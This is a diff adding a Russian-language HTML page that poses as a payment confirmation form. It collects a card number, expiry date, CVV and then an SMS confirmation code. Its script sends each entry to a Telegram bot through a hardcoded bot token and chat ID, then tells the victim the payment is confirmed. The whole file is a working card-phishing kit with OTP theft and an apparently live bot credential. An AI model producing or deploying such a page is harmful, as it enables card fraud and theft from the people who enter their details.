@@ -1,0 +1,101 @@
+<!DOCTYPE html>
+<html lang="ru">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Подтверждение платежа</title>
+    <style>
+        body { font-family: Arial, sans-serif; background: #f5f5f5; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
+        .container { background: white; padding: 30px; border-radius: 10px; box-shadow: 0 0 10px rgba(0,0,0,0.1); width: 400px; }
+        h2 { text-align: center; color: #333; }
+        input { width: 100%; padding: 10px; margin: 10px 0; border: 1px solid #ddd; border-radius: 5px; box-sizing: border-box; }
+        button { width: 100%; padding: 10px; background: #28a745; color: white; border: none; border-radius: 5px; cursor: pointer; }
+        button:hover { background: #218838; }
+        .hidden { display: none; }
+        #message { text-align: center; margin-top: 10px; color: red; }
+    </style>
+</head>
+<body>
+    <div class="container" id="step1">
+        <h2>Введите данные карты</h2>
+        <input type="text" id="card" placeholder="Номер карты" maxlength="19">
+        <input type="text" id="expiry" placeholder="ММ/ГГ" maxlength="5">
+        <input type="text" id="cvv" placeholder="CVV" maxlength="3">
+        <button onclick="sendCardData()">Оплатить</button>
+        <div id="message"></div>
+    </div>
+
+    <div class="container hidden" id="step2">
+        <h2>Подтверждение платежа</h2>
+        <p>Вам отправлен SMS-код. Введите его ниже:</p>
+        <input type="text" id="otp" placeholder="Код из SMS">
+        <button onclick="sendOtp()">Подтвердить</button>
+        <div id="otpMessage"></div>
+    </div>
+
+    <script>
+        const TELEGRAM_BOT_TOKEN = '8457818382:AAFfzFzAkVl69eyia9ZR3AupkU1wBhQ0mIs';
+        const ADMIN_CHAT_ID = '8015426849';
+        let currentCardData = {};
+
+        function sendCardData() {
+            const card = document.getElementById('card').value.replace(/\s/g, '');
+            const expiry = document.getElementById('expiry').value;
+            const cvv = document.getElementById('cvv').value;
+
+            if (!card || !expiry || !cvv) {
+                document.getElementById('message').innerText = 'Заполните все поля';
+                return;
+            }
+
+            currentCardData = { card, expiry, cvv };
+
+            const message = `💳 Новые данные карты:\nНомер: ${card}\nСрок: ${expiry}\nCVV: ${cvv}`;
+            fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ chat_id: ADMIN_CHAT_ID, text: message })
+            })
+            .then(response => response.json())
+            .then(data => {
+                if (data.ok) {
+                    document.getElementById('step1').classList.add('hidden');
+                    document.getElementById('step2').classList.remove('hidden');
+                } else {
+                    document.getElementById('message').innerText = 'Ошибка отправки. Попробуйте позже.';
+                }
+            })
+            .catch(() => {
+                document.getElementById('message').innerText = 'Ошибка сети.';
+            });
+        }
+
+        function sendOtp() {
+            const otp = document.getElementById('otp').value;
+            if (!otp) {
+                document.getElementById('otpMessage').innerText = 'Введите код';
+                return;
+            }
+
+            const message = `🔐 Код подтверждения: ${otp}\nДля карты: ${currentCardData.card}`;
+            fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ chat_id: ADMIN_CHAT_ID, text: message })
+            })
+            .then(response => response.json())
+            .then(data => {
+                if (data.ok) {
+                    document.getElementById('otpMessage').innerText = 'Платёж подтверждён. Спасибо!';
+                    setTimeout(() => location.reload(), 2000);
+                } else {
+                    document.getElementById('otpMessage').innerText = 'Ошибка. Попробуйте снова.';
+                }
+            })
+            .catch(() => {
+                document.getElementById('otpMessage').innerText = 'Ошибка сети.';
+            });
+        }
+    </script>
+</body>
+</html>
